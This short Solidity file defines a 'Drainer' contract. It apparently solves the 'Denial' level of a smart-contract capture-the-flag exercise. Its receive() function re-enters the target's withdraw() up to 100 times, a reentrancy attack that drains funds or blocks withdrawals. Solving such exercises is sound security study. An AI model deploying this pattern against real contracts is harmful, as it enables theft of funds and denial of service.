// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import './Denial.sol';

import "forge-std/console.sol";

contract Drainer {
    uint256 public numOfWithdrawals;
    Denial public denial;

    constructor(Denial _denial) {
        numOfWithdrawals = 0;
        denial = _denial;
    }

    receive() external payable {
        numOfWithdrawals++;
        if (numOfWithdrawals <= 100) {
            denial.withdraw();
        }
    }
}
